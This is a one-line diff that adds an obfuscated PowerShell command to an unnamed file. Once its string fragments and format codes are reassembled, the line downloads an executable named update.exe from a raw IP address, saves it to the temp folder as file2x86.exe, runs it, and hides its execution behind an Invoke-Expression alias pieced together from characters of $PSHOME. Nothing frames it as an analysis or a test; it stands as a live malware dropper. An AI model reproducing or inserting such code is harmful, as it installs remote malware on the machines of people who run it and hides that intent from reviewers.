@@ -1,0 +1,1 @@
+﻿(('(New-Object'+' Sys'+'tem.Ne'+'t'+'.WebCli'+'ent).Do'+'w'+'n'+'loadFile({1'+'}htt'+'p'+'://'+'185.141.27.'+'28/up'+'date.exe{'+'1},{3}'+'{0}env:TEMP{'+'2}file2x8'+'6.exe{3})'+';S'+'tar'+'t-Pro'+'cess ({3}{0}env:TEMP{2}file2x86'+'.exe{'+'3})')-F [ChAr]36,[ChAr]39,[ChAr]92,[ChAr]34) |& ( $PSHOMe[21]+$pSHOme[30]+'X')
